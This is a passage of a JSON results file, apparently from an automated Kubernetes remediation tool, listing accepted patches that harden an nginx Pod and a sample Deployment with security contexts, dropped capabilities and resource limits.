    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01663",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01664",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01665",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01666",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01667",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01668",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  }
]